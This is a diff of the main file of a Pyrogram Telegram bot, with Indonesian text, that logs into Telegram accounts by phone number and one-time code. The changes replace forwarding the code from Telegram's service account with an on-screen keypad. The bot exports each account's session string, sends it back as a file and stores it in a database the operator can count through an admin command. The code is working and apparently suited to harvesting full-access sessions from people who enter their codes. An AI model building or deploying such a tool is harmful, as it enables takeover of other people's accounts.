@@ -1,5 +1,4 @@
-# main.py
-
+# main.py (VERSI FULL FIX + KEYPAD OTP)
 import os
 import re
 import asyncio
@@ -14,6 +13,7 @@ from pyrogram.types import (
     Message,
 )
 from pyrogram.errors import FloodWait, SessionPasswordNeeded, PhoneCodeInvalid
+
 import config
 from bot.database import (
     add_session,
@@ -24,9 +24,11 @@ from bot.database import (
     get_sessions_for_disconnect,
 )
 
+# === FIX: Folder untuk file .session Pyrogram ===
 SESSION_DIR = os.path.join(os.path.dirname(__file__), "sessions")
 os.makedirs(SESSION_DIR, exist_ok=True)
 
+# --- INIT BOT ---
 app = Client(
     "bot",
     api_id=config.API_ID,
@@ -39,7 +41,35 @@ user_states: Dict[int, str] = {}
 pending_logins: Dict[int, Dict[str, Any]] = {}
 
 
-def main_keyboard() -> InlineKeyboardMarkup:
+# === Keypad OTP ===
+def otp_keyboard():
+    return InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton("1", callback_data="digit_1"),
+                InlineKeyboardButton("2", callback_data="digit_2"),
+                InlineKeyboardButton("3", callback_data="digit_3"),
+            ],
+            [
+                InlineKeyboardButton("4", callback_data="digit_4"),
+                InlineKeyboardButton("5", callback_data="digit_5"),
+                InlineKeyboardButton("6", callback_data="digit_6"),
+            ],
+            [
+                InlineKeyboardButton("7", callback_data="digit_7"),
+                InlineKeyboardButton("8", callback_data="digit_8"),
+                InlineKeyboardButton("9", callback_data="digit_9"),
+            ],
+            [
+                InlineKeyboardButton("0", callback_data="digit_0"),
+                InlineKeyboardButton("⌫", callback_data="digit_del"),
+                InlineKeyboardButton("✔", callback_data="digit_ok"),
+            ],
+        ]
+    )
+
+
+def main_keyboard():
     return InlineKeyboardMarkup(
         [
             [
@@ -61,15 +91,13 @@ def main_keyboard() -> InlineKeyboardMarkup:
 
 
 # ---------- COMMAND HANDLERS ----------
-
-
 @app.on_message(filters.private & filters.command("start"))
 async def start_handler(_, m: Message):
     user_states.pop(m.from_user.id, None)
     await m.reply(
         "**Session Manager Bot**\n\n"
         "• Tekan **CONNECT** untuk mulai login akun baru.\n"
-        "• Forward pesan kode dari **@Telegram (777000)** ke sini sebelum menekan READ CODE.",
+        "• Masukkan kode OTP dengan keypad, tidak perlu forward 777000 lagi.",
         reply_markup=main_keyboard(),
     )
 
@@ -88,9 +116,7 @@ async def admin_users_handler(_, m: Message):
     await m.reply(f"[ADMIN] Total semua session tersimpan: {len(rows)}")
 
 
-# ---------- CALLBACK HANDLER UTAMA ----------
-
-
+# ---------- CALLBACK ROUTER ----------
 @app.on_callback_query()
 async def callback_router(_, q: CallbackQuery):
     data = q.data
@@ -98,33 +124,39 @@ async def callback_router(_, q: CallbackQuery):
 
     if data == "connect":
         await handle_connect(q)
+
     elif data == "read_code":
         await handle_read_code(q)
+
     elif data == "list_sesi":
         await handle_list_sesi(q)
+
     elif data == "clear_sesi":
         await handle_clear_sesi(q)
+
     elif data == "disconnect":
         await handle_disconnect(q)
+
     elif data == "clear_chats":
         await handle_clear_chats(q)
+
     elif data == "hp":
         await handle_hp(q)
-    elif data == "reset_pw":
-        await q.answer("Fitur reset password belum diimplementasikan.", show_alert=True)
+
+    elif data.startswith("digit_"):
+        await handle_digit(q)
+
     else:
         await q.answer("Unknown action")
 
 
 # ---------- CALLBACK IMPLEMENTATION ----------
-
-
 async def handle_connect(q: CallbackQuery):
     uid = q.from_user.id
     user_states[uid] = "awaiting_phone"
 
     await q.message.reply(
-        "Kirim nomor telepon akun Telegram yang ingin login.\n"
+        "Kirim nomor telepon akun Telegram.\n"
         "Format internasional tanpa +, contoh: `6281234567890`",
         parse_mode=enums.ParseMode.MARKDOWN,
     )
@@ -132,24 +164,7 @@ async def handle_connect(q: CallbackQuery):
 
 
 async def handle_read_code(q: CallbackQuery):
-    uid = q.from_user.id
-    pending = pending_logins.get(uid)
-
-    if not pending:
-        await q.answer("Tidak ada proses login yang aktif.", show_alert=True)
-        return
-
-    code = pending.get("code")
-    if not code:
-        await q.answer(
-            "Belum ada kode yang terbaca.\n"
-            "Forward pesan kode dari @Telegram (777000) ke bot dulu.",
-            show_alert=True,
-        )
-        return
-
-    await q.answer("Mencoba login dengan kode yang tersimpan...")
-    await do_sign_in(q.message, uid)
+    await q.answer("Tidak perlu tombol ini.\nGunakan keypad OTP.", show_alert=True)
 
 
 async def handle_list_sesi(q: CallbackQuery):
@@ -165,10 +180,7 @@ async def handle_list_sesi(q: CallbackQuery):
 
     for row in sessions:
         sid = row["id"]
-        owner_id = row["owner_id"]
         phone = row.get("phone", "-")
-        session_name = row.get("session_name", "-")
-        session_string = row.get("session_string", "-")
         tg_user_id = row.get("tg_user_id", "-")
         username = row.get("username", "-")
         first_name = row.get("first_name", "-")
@@ -193,6 +205,7 @@ async def handle_list_sesi(q: CallbackQuery):
     await q.message.reply("\n".join(lines))
     await q.answer()
 
+
 async def handle_clear_sesi(q: CallbackQuery):
     uid = q.from_user.id
     count = delete_sessions_by_owner(uid)
@@ -203,6 +216,7 @@ async def handle_clear_sesi(q: CallbackQuery):
 async def handle_disconnect(q: CallbackQuery):
     uid = q.from_user.id
     rows = get_sessions_for_disconnect(uid)
+
     if not rows:
         await q.answer("Tidak ada session aktif.", show_alert=True)
         return
@@ -211,6 +225,7 @@ async def handle_disconnect(q: CallbackQuery):
     for row in rows:
         sid = row["id"]
         session_string = row["session_string"]
+
         try:
             client = Client(
                 name=f"disc_{sid}",
@@ -224,18 +239,14 @@ async def handle_disconnect(q: CallbackQuery):
             await client.disconnect()
             success += 1
         except Exception:
-            # jika gagal logout, lanjut saja
             continue
 
     mark_all_inactive(uid)
-    await q.message.reply(
-        f"DISCONNECT selesai.\nBerhasil logout dari {success} session."
-    )
+    await q.message.reply(f"DISCONNECT selesai.\nBerhasil logout dari {success} session.")
     await q.answer("Disconnect selesai.")
 
 
 async def handle_clear_chats(q: CallbackQuery):
-    # hapus histori chat user dengan bot (sejauh kemampuan bot)
     try:
         await app.delete_history(q.message.chat.id, revoke=True)
         await q.answer("Chat dibersihkan.")
@@ -246,71 +257,80 @@ async def handle_clear_chats(q: CallbackQuery):
 async def handle_hp(q: CallbackQuery):
     uid = q.from_user.id
     sessions = get_sessions_by_owner(uid)
+
     if not sessions:
         await q.answer("Belum ada session.", show_alert=True)
         return
+
     phones = []
     for row in sessions:
         phone = row.get("phone", "-")
         tg_user_id = row.get("tg_user_id", "-")
         username = row.get("username", "-")
         phones.append(f"{phone} → {tg_user_id} (@{username})")
+
     text = "Daftar nomor yang tersimpan:\n\n" + "\n".join(phones)
     await q.message.reply(text)
     await q.answer()
 
 
-# ---------- MESSAGE HANDLER UNTUK PHONE & FORWARD KODE ----------
+# ---------- OTP KEYPAD HANDLER ----------
+async def handle_digit(q: CallbackQuery):
+    uid = q.from_user.id
+    pending = pending_logins.get(uid)
+
+    if not pending:
+        await q.answer("Tidak ada proses login aktif!", show_alert=True)
+        return
+
+    digits = pending.get("code_digits", "")
+
+    action = q.data.replace("digit_", "")
+
+    if action == "del":
+        digits = digits[:-1]
+
+    elif action == "ok":
+        if len(digits) < 5:
+            await q.answer("Kode belum lengkap!", show_alert=True)
+            return
+
+        pending["code"] = digits
+
+        await q.message.reply(
+            f"Kode OTP diterima: `{digits}`\nMencoba login...",
+            parse_mode="markdown",
+        )
+        return await do_sign_in(q.message, uid)
+
+    else:  
+        if len(digits) < 5:
+            digits += action
+
+    pending["code_digits"] = digits
+
+    await q.message.edit(
+        f"Masukkan kode OTP:\n`{digits}`",
+        parse_mode="markdown",
+        reply_markup=otp_keyboard(),
+    )
+    await q.answer()
 
 
+# ---------- LOGIN FLOW ----------
 @app.on_message(filters.private & ~filters.command(["start", "users", "admin_users"]))
 async def generic_message_handler(_, m: Message):
     uid = m.from_user.id
     state = user_states.get(uid)
 
-    # Step 1: user sedang diminta kirim nomor HP
     if state == "awaiting_phone":
         phone = re.sub(r"[^\d]", "", m.text or "")
         if len(phone) < 7:
-            await m.reply(
-                "Nomor tidak valid.\n"
-                "Kirim lagi dengan format angka saja, contoh: `6281234567890`",
-                parse_mode=enums.ParseMode.MARKDOWN,
-            )
+            await m.reply("Nomor tidak valid.")
             return
 
         await start_login_process(m, phone)
         return
-
-    # Step 2: user forward kode dari 777000
-    if state == "waiting_code_forward":
-        if m.forward_from and m.forward_from.id == 777000 and (m.text or ""):
-            match = re.search(r"\d{5}", m.text)
-            if not match:
-                await m.reply("Tidak menemukan kode 5 digit di pesan itu.")
-                return
-
-            code = match.group(0)
-            pending = pending_logins.get(uid)
-            if not pending:
-                await m.reply("Tidak ada proses login yang aktif.")
-                return
-
-            pending["code"] = code
-            await m.reply(
-                f"Kode berhasil dibaca: `{code}`\n"
-                "Sekarang tekan tombol **READ CODE** untuk melanjutkan login.",
-                parse_mode=enums.ParseMode.MARKDOWN,
-                reply_markup=main_keyboard(),
-            )
-        else:
-            await m.reply(
-                "Kirim/forward pesan kode dari **@Telegram (777000)** ke bot ini.",
-                parse_mode=enums.ParseMode.MARKDOWN,
-            )
-
-
-# ---------- LOGIN FLOW HELPER ----------
 
 
 async def start_login_process(m: Message, phone: str):
@@ -318,16 +338,14 @@ async def start_login_process(m: Message, phone: str):
 
     await m.reply(
         f"Mengirim kode ke nomor: `{phone}`\n"
-        "Jika sudah menerima kode dari @Telegram (777000), forward ke bot ini,\n"
-        "lalu tekan tombol **READ CODE**.",
-        parse_mode=enums.ParseMode.MARKDOWN,
-        reply_markup=main_keyboard(),
+        "Masukkan kode OTP dengan keypad.",
+        parse_mode="markdown",
+        reply_markup=otp_keyboard(),
     )
 
-    # siapkan client user sementara
     session_name = os.path.join(
         SESSION_DIR, f"{uid}_{int(datetime.now().timestamp())}"
-)
+    )
 
     user_client = Client(
         session_name,
@@ -338,15 +356,8 @@ async def start_login_process(m: Message, phone: str):
     try:
         await user_client.connect()
         sent = await user_client.send_code(phone)
-    except FloodWait as e:
-        await asyncio.sleep(e.value)
-        sent = await user_client.send_code(phone)
     except Exception as e:
         await m.reply(f"Gagal mengirim kode: `{e}`")
-        try:
-            await user_client.disconnect()
-        except Exception:
-            pass
         return
 
     pending_logins[uid] = {
@@ -355,17 +366,19 @@ async def start_login_process(m: Message, phone: str):
         "session_name": session_name,
         "phone_code_hash": sent.phone_code_hash,
         "code": None,
+        "code_digits": "",
     }
-    user_states[uid] = "waiting_code_forward"
+
+    user_states[uid] = "waiting_otp_keypad"
 
 
 async def do_sign_in(msg: Message, uid: int):
     pending = pending_logins.get(uid)
     if not pending:
-        await msg.reply("Tidak ada proses login yang aktif.")
+        await msg.reply("Tidak ada proses login.")
         return
 
-    client: Client = pending["client"]
+    client = pending["client"]
     phone = pending["phone"]
     code = pending["code"]
     phone_code_hash = pending["phone_code_hash"]
@@ -378,23 +391,19 @@ async def do_sign_in(msg: Message, uid: int):
             phone_code_hash=phone_code_hash,
         )
     except PhoneCodeInvalid:
-        await msg.reply("Kode salah. Forward ulang kode dari 777000 lalu READ CODE lagi.")
+        await msg.reply("Kode salah! Ulangi lagi.")
         return
     except SessionPasswordNeeded:
-        await msg.reply(
-            "Akun ini menggunakan verifikasi dua langkah (password).\n"
-            "Fitur ini belum mendukung login akun dengan 2FA."
-        )
+        await msg.reply("Akun ini memakai 2FA, bot belum support.")
         return
     except FloodWait as e:
-        await msg.reply(f"FloodWait {e.value}s, menunggu sebentar...")
+        await msg.reply(f"Flood wait {e.value}s.")
         await asyncio.sleep(e.value)
         return
     except Exception as e:
         await msg.reply(f"Gagal login: `{e}`")
         return
 
-    # login sukses, ambil info dan simpan
     me = await client.get_me()
     session_string = await client.export_session_string()
 
@@ -415,48 +424,26 @@ async def do_sign_in(msg: Message, uid: int):
 
     add_session(data)
 
-    # simpan string session ke file txt supaya bisa diunduh
     txt_path = pending["session_name"] + ".txt"
     with open(txt_path, "w", encoding="utf-8") as f:
         f.write(session_string)
 
-    # file .session yang dibuat Pyrogram
-    session_file_path = pending["session_name"] + ".session"
-
     summary = (
         "✅ Session berhasil dibuat!\n\n"
-        f"STATUS: ✅ Aktif\n"
         f"ID: `{me.id}`\n"
-        f"USERNAME: @{me.username if me.username else '-'}\n"
+        f"USERNAME: @{me.username or '-'}\n"
         f"NAMA: {me.first_name}\n"
         f"NOHP: `{phone}`\n"
         f"TANGGAL: {created_at}\n"
     )
 
-    await msg.reply(
-        summary,
-        parse_mode=enums.ParseMode.MARKDOWN,
-        reply_markup=main_keyboard(),
-    )
+    await msg.reply(summary, reply_markup=main_keyboard())
 
-    # kirim file string session + file .session kalau ada
-    await app.send_document(
-        msg.chat.id,
-        txt_path,
-        caption="String session kamu (jaga baik-baik).",
-    )
+    await app.send_document(msg.chat.id, txt_path, caption="String session kamu.")
 
-    if os.path.exists(session_file_path):
-        await app.send_document(
-            msg.chat.id,
-            session_file_path,
-            caption="File .session Pyrogram kamu.",
-        )
-
-    # beres, bersihkan state
     try:
         await client.disconnect()
-    except Exception:
+    except:
         pass
 
     pending_logins.pop(uid, None)
@@ -464,7 +451,6 @@ async def do_sign_in(msg: Message, uid: int):
 
 
 # ---------- MAIN ----------
-
 if __name__ == "__main__":
     print("BOT SESSION MANAGER BERJALAN...")
     app.run()
